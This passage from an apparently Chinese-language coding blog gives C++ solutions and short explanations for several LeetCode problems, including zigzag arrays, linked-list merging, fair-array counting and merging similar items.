class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(nums[<span class="number">0</span>] &gt;= nums[<span class="number">1</span>]) &#123;</span><br><span class="line">            even2less += nums[<span class="number">0</span>] - nums[<span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(nums[n<span class="number">-1</span>] &gt;= nums[n<span class="number">-2</span>]) &#123;</span><br><span class="line">            <span class="keyword">if</span>((n<span class="number">-1</span>)%<span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                even2less += nums[n<span class="number">-1</span>] - nums[n<span class="number">-2</span>] + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                odd2less += nums[n<span class="number">-1</span>] - nums[n<span class="number">-2</span>] + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">min</span>(even2less, odd2less);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>遍历所有奇数，使其小于两端，记录操作数1<br>遍历所有偶数，使其小于两端，记录操作数2<br>返回最小值</p></blockquote><h3 id="优化代码行数"><a href="#优化代码行数" class="headerlink" title="优化代码行数"></a>优化代码行数</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">movesToMakeZigzag</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> op[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;, n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n &lt;= <span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] &gt;= <span class="built_in">min</span>(nums[i<span class="number">-1</span>], nums[i+<span class="number">1</span>]))</span><br><span class="line">                op[i&amp;<span class="number">1</span>] += nums[i] - <span class="built_in">min</span>(nums[i<span class="number">-1</span>], nums[i+<span class="number">1</span>]) + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(nums[<span class="number">0</span>] &gt;= nums[<span class="number">1</span>]) &#123;</span><br><span class="line">            op[<span class="number">0</span>] += nums[<span class="number">0</span>] - nums[<span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(nums[n<span class="number">-1</span>] &gt;= nums[n<span class="number">-2</span>]) &#123;</span><br><span class="line">            op[(n<span class="number">-1</span>)&amp;<span class="number">1</span>] += nums[n<span class="number">-1</span>] - nums[n<span class="number">-2</span>] + <span class="number">1</span>;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">min</span>(op[<span class="number">0</span>], op[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="2325-解密消息"><a href="#2325-解密消息" class="headerlink" title="2325. 解密消息"></a><a href="https://leetcode.cn/problems/decode-the-message/submissions/406636854/">2325. 解密消息</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">decodeMessage</span><span class="params">(string key, string message)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; alphabet = <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">26</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="type">int</span> klen = key.<span class="built_in">length</span>(), slen = message.<span class="built_in">length</span>(), index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; klen &amp;&amp; index &lt; <span class="number">26</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">isalpha</span>(key[i]) &amp;&amp; alphabet[key[i] - <span class="string">&#x27;a&#x27;</span>] == <span class="number">-1</span>) &#123;</span><br><span class="line">                alphabet[key[i] - <span class="string">&#x27;a&#x27;</span>] = <span class="string">&#x27;a&#x27;</span> + index++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; slen; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">isalpha</span>(message[i]))</span><br><span class="line">                message[i] = alphabet[message[i] - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="2319-判断矩阵是否是一个-X-矩阵"><a href="#2319-判断矩阵是否是一个-X-矩阵" class="headerlink" title="2319. 判断矩阵是否是一个 X 矩阵"></a><a href="https://leetcode.cn/problems/check-if-matrix-is-x-matrix/description/">2319. 判断矩阵是否是一个 X 矩阵</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">checkXMatrix</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = grid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>((i - j == <span class="number">0</span> || i + j == n - <span class="number">1</span>)) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(grid[i][j] == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span>(grid[i][j] != <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>主对角线，副对角线上的元素不能是0，其他必须是0<br>主对角线上的点满足 $ i - j &#x3D;&#x3D; 0 $， 副对角线上满足 $ i + j &#x3D;&#x3D; n-1 $</p></blockquote><h2 id="1669-合并两个链表"><a href="#1669-合并两个链表" class="headerlink" title="1669. 合并两个链表"></a><a href="https://leetcode.cn/problems/merge-in-between-linked-lists/description/">1669. 合并两个链表</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">mergeInBetween</span><span class="params">(ListNode* list1, <span class="type">int</span> a, <span class="type">int</span> b, ListNode* list2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">        ListNode *dummy = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>, list1), *x, *y, *move;</span><br><span class="line">        <span class="keyword">for</span>(move = dummy; i &lt;= b; move = move-&gt;next, i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i == a) &#123;</span><br><span class="line">                x = move;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i == b) &#123;</span><br><span class="line">                y = move-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        x-&gt;next = list2;</span><br><span class="line">        move = list2;</span><br><span class="line">        <span class="keyword">while</span>(move-&gt;next != <span class="literal">nullptr</span>) move = move-&gt;next;</span><br><span class="line">        move-&gt;next = y-&gt;next;</span><br><span class="line">        <span class="keyword">return</span> dummy-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">mergeInBetween</span><span class="params">(ListNode* list1, <span class="type">int</span> a, <span class="type">int</span> b, ListNode* list2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">        ListNode *x, *y;</span><br><span class="line">        <span class="keyword">for</span>(x = list1; i &lt; a<span class="number">-1</span>; x = x-&gt;next, i++);</span><br><span class="line">        <span class="keyword">for</span>(y = x; i &lt; b; y = y-&gt;next, i++);</span><br><span class="line">        x-&gt;next = list2;</span><br><span class="line">        <span class="keyword">while</span>(list2-&gt;next != <span class="literal">nullptr</span>) list2 = list2-&gt;next;</span><br><span class="line">        list2-&gt;next = y-&gt;next;</span><br><span class="line">        <span class="keyword">return</span> list1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>题目中 a, b的范围是 $ 1 &lt;&#x3D; a &lt;&#x3D; b &lt; list1.length - 1 $，第一个节点不需要被删除，所以dummy节点是多余的<br>将寻找a，b的for循环拆成两块，减少if跳转指令的执行次数<br>move节点也是多余的</p></blockquote><h2 id="2315-统计星号"><a href="#2315-统计星号" class="headerlink" title="2315. 统计星号"></a><a href="https://leetcode.cn/problems/count-asterisks/description/">2315. 统计星号</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countAsterisks</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = s.<span class="built_in">length</span>();</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(;i &lt; len &amp;&amp; s[i] != <span class="string">&#x27;|&#x27;</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(s[i] == <span class="string">&#x27;*&#x27;</span>) count++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(i++; i &lt; len &amp;&amp; s[i] != <span class="string">&#x27;|&#x27;</span>; i++);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="1664-生成平衡数组的方案数"><a href="#1664-生成平衡数组的方案数" class="headerlink" title="1664. 生成平衡数组的方案数"></a><a href="https://leetcode.cn/problems/ways-to-make-a-fair-array/description/">1664. 生成平衡数组的方案数</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">waysToMakeFair</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>(), ret = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(n &lt;= <span class="number">1</span>) <span class="keyword">return</span> n;</span><br><span class="line">        <span class="type">int</span> len = n;</span><br><span class="line">        <span class="keyword">if</span>(n % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">            nums.<span class="built_in">push_back</span>(<span class="number">0</span>);</span><br><span class="line">            n++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">preSum</span><span class="params">(n + <span class="number">2</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            preSum[i+<span class="number">2</span>] = preSum[i] + nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="type">int</span> odd = <span class="number">0</span>, even = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                even = preSum[n<span class="number">-1</span> + <span class="number">2</span>] - preSum[i+<span class="number">2</span><span class="number">-1</span>] + preSum[i + <span class="number">2</span> <span class="number">-2</span>];</span><br><span class="line">                odd = preSum[n<span class="number">-2</span> + <span class="number">2</span>] - preSum[i + <span class="number">2</span>] + preSum[i+<span class="number">2</span> - <span class="number">1</span>];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                even = preSum[n<span class="number">-1</span>+<span class="number">2</span>] - preSum[i+<span class="number">2</span>] + preSum[i+<span class="number">2</span> <span class="number">-1</span>];</span><br><span class="line">                odd = preSum[n<span class="number">-2</span>+<span class="number">2</span>] - preSum[i+<span class="number">2</span>+<span class="number">1</span><span class="number">-2</span>] + preSum[i+<span class="number">2</span><span class="number">-2</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(even == odd) &#123;</span><br><span class="line">                ret++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>分奇数下标和偶数下标计算前缀和<br>当某个值被删除时，其后方奇数下标边偶数下标，偶数下标边奇数下标，前方则不变。<br>假设删除某个数，计算变化后的奇偶下标之和，如果相等，则方案数+1<br>为了方便代码编写，如果n是奇数，则添加一个0保证其为偶数，但注意删除添加的这个数使得平衡并不算有效方案</p></blockquote><h3 id="空间优化"><a href="#空间优化" class="headerlink" title="空间优化"></a>空间优化</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">waysToMakeFair</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>(), ret = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(n &lt;= <span class="number">1</span>) <span class="keyword">return</span> n;</span><br><span class="line">        <span class="type">int</span> odd1, even1, odd2, even2;</span><br><span class="line">        odd1 = even1 = odd2 = even2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i&amp;<span class="number">1</span>) &#123;</span><br><span class="line">                odd2+=nums[i];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                even2+=nums[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i&amp;<span class="number">1</span>) &#123;</span><br><span class="line">                odd2-=nums[i];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                even2-=nums[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(odd2 + even1 == odd1 + even2) ret++;</span><br><span class="line">            <span class="keyword">if</span>(i&amp;<span class="number">1</span>) &#123;</span><br><span class="line">                odd1+=nums[i];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                even1+=nums[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>odd2,even2表示位置i被删除后，被删除元素后方的奇数下标和和偶数下标和（相对于未改变前的）<br>odd1,even1表示位置i被删除后，被删除元素前方的奇数下标和和偶数下标和<br>假设删除i，就从odd2或even2中删除<br>由于变化后奇数下标变偶数，偶数变奇数，则比较 $(odd2 + even1 &#x3D;&#x3D; odd1 + even2)$是否成立<br>比较后，将i加回odd1或even1</p></blockquote><h2 id="2309-兼具大小写的最好英文字母"><a href="#2309-兼具大小写的最好英文字母" class="headerlink" title="2309. 兼具大小写的最好英文字母"></a><a href="https://leetcode.cn/problems/greatest-english-letter-in-upper-and-lower-case/">2309. 兼具大小写的最好英文字母</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">greatestLetter</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">upper</span><span class="params">(<span class="number">26</span>, <span class="literal">false</span>)</span>,<span class="title">lower</span><span class="params">(<span class="number">26</span>, <span class="literal">false</span>)</span></span>;</span><br><span class="line">        <span class="type">char</span> maxx = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span> c : s) &#123;</span><br><span class="line">            <span class="keyword">if</span>(c &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;Z&#x27;</span>) &#123;</span><br><span class="line">                upper[c - <span class="string">&#x27;A&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">if</span>(lower[c-<span class="string">&#x27;A&#x27;</span>] &amp;&amp; c-<span class="string">&#x27;A&#x27;</span> &gt; maxx) &#123;</span><br><span class="line">                    maxx = c - <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(c &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;z&#x27;</span>) &#123;</span><br><span class="line">                lower[c - <span class="string">&#x27;a&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">if</span>(upper[c-<span class="string">&#x27;a&#x27;</span>] &amp;&amp; c-<span class="string">&#x27;a&#x27;</span> &gt; maxx) &#123;</span><br><span class="line">                    maxx = c-<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxx &gt;= <span class="number">0</span> ? <span class="built_in">string</span>(<span class="number">1</span>, maxx + <span class="string">&#x27;A&#x27;</span>) : <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="2363-合并相似的物品"><a href="#2363-合并相似的物品" class="headerlink" title="2363. 合并相似的物品"></a><a href="https://leetcode.cn/problems/merge-similar-items/description/">2363. 合并相似的物品</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">mergeSimilarItems</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; items1, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; items2) &#123;</span><br><span class="line">        map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; m;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; v : items1) &#123;</span><br><span class="line">            m[v[<span class="number">0</span>]] += v[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; v : items2) &#123;</span><br><span class="line">            m[v[<span class="number">0</span>]] += v[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; ret;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> ite = m.<span class="built_in">begin</span>(); ite != m.<span class="built_in">end</span>(); ite++) &#123;</span><br><span class="line">            <span class="keyword">auto</span>&amp; [x, y] = *ite;</span><br><span class="line">            ret.<span class="built_in">push_back</span>(&#123;x, y&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">mergeSimilarItems</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; items1, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; items2) &#123;</span><br><span class="line">        <span class="built_in">sort</span>(items1.<span class="built_in">begin</span>(), items1.<span class="built_in">end</span>(), [](vector&lt;<span class="type">int</span>&gt;&amp; x, vector&lt;<span class="type">int</span>&gt;&amp; y)-&gt;<span class="type">bool</span>&#123;<span class="keyword">return</span> x[<span class="number">0</span>] &lt; y[<span class="number">0</span>];&#125;);</span><br><span class="line">        <span class="built_in">sort</span>(items2.<span class="built_in">begin</span>(), items2.<span class="built_in">end</span>(), [](vector&lt;<span class="type">int</span>&gt;&amp; x, vector&lt;<span class="type">int</span>&gt;&amp; y)-&gt;<span class="type">bool</span>&#123;<span class="keyword">return</span> x[<span class="number">0</span>] &lt; y[<span class="number">0</span>];&#125;);</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, value = <span class="built_in">min</span>(items1[<span class="number">0</span>][<span class="number">0</span>], items2[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line">        <span class="type">int</span> n1 = items1.<span class="built_in">size</span>(), n2 = items2.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; ret&#123;&#123;value, <span class="number">0</span>&#125;&#125;;</span><br><span class="line">        <span class="type">int</span> retSize = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; n1 &amp;&amp; j &lt; n2) &#123;</span><br><span class="line">            <span class="keyword">while</span>(i &lt; n1 &amp;&amp; items1[i][<span class="number">0</span>] == value) &#123;</span><br><span class="line">                ret[retSize][<span class="number">1</span>] += items1[i][<span class="number">1</span>];</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(j &lt; n2 &amp;&amp; items2[j][<span class="number">0</span>] == value) &#123;</span><br><span class="line">                ret[retSize][<span class="number">1</span>] += items2[j][<span class="number">1</span>];</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i &lt; n1 &amp;&amp; j &lt; n2) &#123;</span><br><span class="line">                value = <span class="built_in">min</span>(items1[i][<span class="number">0</span>], items2[j][<span class="number">0</span>]);</span><br><span class="line">                ret.<span class="built_in">push_back</span>(&#123;value, <span class="number">0</span>&#125;);</span><br><span class="line">                retSize++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; n1) &#123;</span><br><span class="line">            ret.<span class="built_in">push_back</span>(&#123;items1[i][<span class="number">0</span>], items1[i][<span class="number">1</span>]&#125;);</span><br><span class="line">            